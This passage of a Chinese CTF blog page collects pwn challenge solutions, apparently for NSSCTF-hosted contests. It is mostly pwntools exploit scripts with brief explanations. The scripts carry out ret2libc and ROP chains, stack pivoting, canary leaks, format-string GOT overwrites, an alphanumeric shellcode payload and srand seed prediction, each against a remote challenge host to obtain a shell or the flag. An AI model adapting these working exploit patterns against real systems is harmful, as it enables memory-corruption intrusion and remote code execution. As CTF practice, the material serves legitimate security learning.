href=\"#hgame-2022-week1test-your-gdb\">#</a> [HGAME 2022 week1]test your gdb</h5>\n<p><figure class=\"highlight plaintext\"><figcaption><span>pwn import *</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#p = process(&quot;./../testYourGdb&quot;)</span><br><span class=\"line\">elf = ELF(&quot;./../testYourGdb&quot;)</span><br><span class=\"line\">p = remote(&quot;1.14.71.254&quot;,28150)</span><br><span class=\"line\"></span><br><span class=\"line\">cmpText = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = 0x401256</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(b&#x27;word\\n&#x27;)</span><br><span class=\"line\">p.send(cmpText)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv(0x18)</span><br><span class=\"line\">canary = u64(p.recv(8))</span><br><span class=\"line\">print(hex(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">padding = b&#x27;a&#x27; * (0x28 - 0x10)</span><br><span class=\"line\">payload = padding + p64(canary) + p64(0) + p64(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezr0p64\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezr0p64\">#</a> [HNCTF 2022 Week1]ezr0p64</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">已经给了.so.6了直接打ret2libc</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=&#x27;linux&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./ezrop64&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28053)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = 0x4012a3</span><br><span class=\"line\"></span><br><span class=\"line\">ret = 0x40101a</span><br><span class=\"line\"></span><br><span class=\"line\">vuln = elf.sym[&#x27;vuln&#x27;]</span><br><span class=\"line\">p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = int(p.recv(14),16)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = libc_base + next(libc.search(b&quot;/bin/sh\\x00&quot;))</span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x108 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023真男人下120层\"><a class=\"anchor\" href=\"#gdouctf-2023真男人下120层\">#</a> [GDOUCTF 2023] 真男人下 120 层</h5>\n<p>套着两层 rand 需要定义两次 srand 使用 python 的 ctypes 的库来进行解题</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">import ctypes</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand.argtypes=[ctypes.c_uint]</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand(libc.time(0))</span><br><span class=\"line\"></span><br><span class=\"line\">rand_result=libc.rand()</span><br><span class=\"line\"></span><br><span class=\"line\">libc.srand(rand_result%3-1522127470)</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28105)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;trap.&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(120):</span><br><span class=\"line\"></span><br><span class=\"line\">    rand_r=libc.rand()%4+1</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&#x27;Floor&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(str(rand_r))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hubuctf-2022-新生赛fmt\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛fmt\">#</a> [HUBUCTF 2022 新生赛] fmt</h5>\n<p>本地测试查看 flag.txt 被读后的栈地址看到偏移多少利用 % p 来获得 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28473)</span><br><span class=\"line\"># get flag</span><br><span class=\"line\"># 根据 format 和 s 在栈上的相对位置计算读取位置：(0x60 - 0x40 / 8) + 5 = 12</span><br><span class=\"line\">flag_addr = 12</span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    p.sendlineafter(b&#x27;Echo as a service&#x27;, &#x27;%&#123;&#125;$p&#x27;.format(flag_addr))</span><br><span class=\"line\">    p.recvuntil(b&#x27;0x&#x27;)</span><br><span class=\"line\">    part = p.recvuntil(b&#x27;\\n&#x27;)[:-1]</span><br><span class=\"line\">    for i in range(0, len(part), 2):</span><br><span class=\"line\">        index = len(part) - i</span><br><span class=\"line\">        flag += chr(int(part[index - 2:index].ljust(2, b&#x27;0&#x27;), 16))</span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">    if &#x27;&#125;&#x27; in flag:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    flag_addr += 1</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week1ezcmp\"><a class=\"anchor\" href=\"#hnctf-2022-week1ezcmp\">#</a> [HNCTF 2022 Week1]ezcmp</h5>\n<p>ida 查看到他必须要和 buf 相同才能得到 shell 那我们就去 gdb 调试查看 buff 的值 x/10a 可以查看到 buff 的值段把他输进 buf 即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">#context(log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28286)</span><br><span class=\"line\">payload=p64(0x144678aadc0e4072)+p64(0x84b6e81a4c7eb0e2)+p64(0xf426588abcee2052)+p64(0xc8cb2c5e90c2)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"litctf-2023狠狠的溢出涅~\"><a class=\"anchor\" href=\"#litctf-2023狠狠的溢出涅~\">#</a> [LitCTF 2023] 狠狠的溢出涅～</h5>\n<p>新知识 \\x00 能够截断 strlen</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       = lambda data               :io.send(data)</span><br><span class=\"line\">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class=\"line\">sl      = lambda data               :io.sendline(data)</span><br><span class=\"line\">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class=\"line\">r       = lambda num                :io.recv(num)</span><br><span class=\"line\">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = lambda                    :io.interactive()</span><br><span class=\"line\">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">ls      = lambda data               :log.success(data)</span><br><span class=\"line\"></span><br><span class=\"line\">binary = &#x27;./pwn4&#x27;</span><br><span class=\"line\">libelf = &#x27;./libc-2.31.so&#x27;</span><br><span class=\"line\">target = &#x27;&#x27;</span><br><span class=\"line\">target = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch      = &#x27;amd64&#x27;</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">context.terminal  = [&#x27;tme?mux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;130&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28710)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(binary)</span><br><span class=\"line\"></span><br><span class=\"line\">pad = 0x68</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(binary)</span><br><span class=\"line\">rop = ROP(binary)</span><br><span class=\"line\">libc = ELF(libelf)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = rop.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;])[0]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">vuln = 0x4006B0</span><br><span class=\"line\">ret = 0x0400768</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pay = pad * b&#x27;\\x00&#x27; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">ru(&#x27;Received\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">x = uu64(r(6))</span><br><span class=\"line\">libc_base = x - libc.sym[&#x27;puts&#x27;]</span><br><span class=\"line\">system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class=\"line\">bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">ls(hex(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pay = pad * b&#x27;\\x00&#x27; + p64(ret)*1 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(vuln)</span><br><span class=\"line\">sl(pay)</span><br><span class=\"line\">sl(&#x27;ls&#x27;)</span><br><span class=\"line\">sl(&#x27;cat flag&#x27;)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hnctf-2022-week2ez_backdoor\"><a class=\"anchor\" href=\"#hnctf-2022-week2ez_backdoor\">#</a> [HNCTF 2022 WEEK2]ez_backdoor</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import time</span><br><span class=\"line\">io = remote(&#x27;node5.anna.nssctf.cn&#x27;,28762)</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">#io = process(binary)</span><br><span class=\"line\">bin_sh=0x4011CA</span><br><span class=\"line\">ret=0x40101a</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x108)+p64(ret)+p64(bin_sh)</span><br><span class=\"line\">io.sendafter(b&#x27;llenge\\n&#x27;,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"nisactf-2022shop_pwn\"><a class=\"anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h5>\n<p>ida 查看 game 函数里面有一个函数来创建多线程，但是有个 bug，money 是公共资源，这个线程创建时另外一个线程也创建了，如果太快会造成都在卖那个 pen 直接构造一个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo -e &quot;3\\n0\\n3\\n0\\n2\\n1\\n1\\&quot;|nc node5.anna.nssctf.cn 28765</span><br></pre></td></tr></table></figure></p>\n<p>即可查看到 flag</p>\n<h5 id=\"hdctf-2023keep-on\"><a class=\"anchor\" href=\"#hdctf-2023keep-on\">#</a> [HDCTF 2023]KEEP ON</h5>\n<p>这个题注意的字符串溢出是一个点还能够利用栈迁移来获取 shell，字符串溢出的话是利用 printf 的溢出点是 6 然后使用 fmtstr_payload 来让 system_plt 来和 printf_got 进行切换在利用后面那个 read 允许溢出 8 个字节来返回到 vuln 去在字符串溢出这里输入 /bin/sh 即可得到 shell</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>ON</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">elf = ELF(&quot;./hdctf&quot;)</span><br><span class=\"line\">#p = process(&#x27;./hdctf&#x27;)</span><br><span class=\"line\">p = remote(&quot;node4.anna.nssctf.cn&quot;,28307)</span><br><span class=\"line\">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class=\"line\">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">payload1 = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)</span><br><span class=\"line\">log.info(payload1)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;name: \\n&#x27;,payload1)</span><br><span class=\"line\">vuln_addr = 0x40076F</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">payload2 =b&#x27;a&#x27;*(0x50+0x8) + p64(vuln_addr)</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;on !\\n&#x27;,payload2)</span><br><span class=\"line\">#pause()</span><br><span class=\"line\">sleep(0.1)</span><br><span class=\"line\">p.sendafter(&#x27;name: \\n&#x27;,&quot;/bin/sh\\x00&quot;)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>还能使用栈迁移如:<br />\n 使用字符串泄露来得到 rbp 栈底位置，使用 stack 查看 rbp 是多少在使用溢出满满调试得到为 %16p 即可得到 rbp，在 s 处输入字符后使用 pwndbg 的 search 查看位置，然后在计算和 s 的值相差多少，使用 pwndbg 的 distance 即可计算出相差量为 60,rbp 和 s 相差 0x60 还有 0x8 的返回地址，即可算到需要迁移的栈地址为多多 qianyi_rbp-0x60-0x8, 在使用常规的 rdi pop;ret 来将 /bin/sh 压入 system 函数中，但是中间需要加一个 qianyi_rbp-0x20 来维持栈平衡</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28526)</span><br><span class=\"line\">io.recvuntil(b&#x27;name: \\n&#x27;)</span><br><span class=\"line\">elf=ELF(&#x27;./hdctf&#x27;)</span><br><span class=\"line\">fmtpayload = b&#x27;%16$p&#x27;</span><br><span class=\"line\">io.send(fmtpayload)</span><br><span class=\"line\">io.recvuntil(b&#x27;hello,0x&#x27;)</span><br><span class=\"line\">old_rbp = int(io.recv(12), 16)</span><br><span class=\"line\">log.success(&#x27;RBP Addr: &#x27; + (hex(old_rbp)))</span><br><span class=\"line\">leave_ret = 0x4007F2</span><br><span class=\"line\">rdi = 0x4008D3</span><br><span class=\"line\">system = elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\">Target_Addr = old_rbp - 0x60 - 0x08</span><br><span class=\"line\"># RDI will pop binsh addr as system&#x27;s arg</span><br><span class=\"line\"># Offset : 0x08</span><br><span class=\"line\">Payload = p64(rdi)</span><br><span class=\"line\"># Offset : 0x08 + 0x08</span><br><span class=\"line\">Payload += p64(Target_Addr + 0x8 + 0x18)</span><br><span class=\"line\"># Offset : 0x08 + 0x10</span><br><span class=\"line\">Payload += p64(system)</span><br><span class=\"line\"># Offset : 0x08 + 0x18</span><br><span class=\"line\">Payload += b&#x27;/bin/sh\\x00&#x27;</span><br><span class=\"line\"># Fill the Payload to 0x50.</span><br><span class=\"line\">Payload = Payload.ljust(0x50, b&#x27;\\x00&#x27;)</span><br><span class=\"line\"># The Leave Ret cmd&#x27;s ret addr.</span><br><span class=\"line\">Payload += p64(Target_Addr)</span><br><span class=\"line\"># The Leave Ret</span><br><span class=\"line\">Payload += p64(leave_ret)</span><br><span class=\"line\">log.info(Payload)</span><br><span class=\"line\">io.recvuntil(b&#x27;keep on !\\n&#x27;)</span><br><span class=\"line\">io.send(Payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-新生赛shellcode\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛shellcode\">#</a> [SWPUCTF 2022 新生赛] shellcode？</h5>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbGNyYWZ0LXNqMnA2NDNhanQ4Y3V0MmFxaTNhYnRlZTQ3Y2d3NGN2aWE3MmNuMjRlLnNo\">还不能输入比较长的我用 shellcraft.sh</span> () 生成不行</p>\n<h5 id=\"nustctf-2022-新生赛ezpwn\"><a class=\"anchor\" href=\"#nustctf-2022-新生赛ezpwn\">#</a> [NUSTCTF 2022 新生赛] ezPwn</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">什么判断直接不管gets溢出后直接跳转到system地址即可</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">p=remote()</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">payload=cyclic(0x12)+p64(elf.sym[&#x27;system&#x27;])</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hgame-2023-week1easy_overflow\"><a class=\"anchor\" href=\"#hgame-2023-week1easy_overflow\">#</a> [HGAME 2023 week1]easy_overflow</h5>\n<p>很简单的一个 ret2text 但是有个坑点就是 close (1) 这个点你需要连上去后使用 exec 1&gt;&amp;0 来打开标准输出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28539)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x18+p64(0x40101a)+p64(0x401176)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2022-初赛login_normal\"><a class=\"anchor\" href=\"#ciscn-2022-初赛login_normal\">#</a> [CISCN 2022 初赛] login_normal</h5>\n<p>这个题考点在于代码审计</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.arch=&#x27;amd64&#x27;</span><br><span class=\"line\">io=remote(&quot;node4.anna.nssctf.cn&quot;,28823)</span><br><span class=\"line\">#io=process(&#x27;./login&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(&quot;=================&quot;)</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">payload = b&#x27;opt:1\\nmsg:ro0tt\\n&#x27;</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">#shellcode = shellcraft.sh()</span><br><span class=\"line\">shellcode=b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span><br><span class=\"line\">payload = b&#x27;opt:2\\nmsg:&#x27;+shellcode+b&#x27;\\n&#x27;</span><br><span class=\"line\">io.recvuntil(&quot;&gt;&gt;&gt; &quot;)</span><br><span class=\"line\">#gdb.attach(io)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"swpuctf-2022-新生赛darling\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛darling\">#</a> [SWPUCTF 2022 新生赛] Darling</h5>\n<p>随机数 srand</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">libc.srand(0x1317E53)</span><br><span class=\"line\">sl=libc.rand()%100-64</span><br><span class=\"line\">p.sendline(str(sl))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"uuctf-2022-新生赛babystack\"><a class=\"anchor\" href=\"#uuctf-2022-新生赛babystack\">#</a> [UUCTF 2022 新生赛] babystack</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 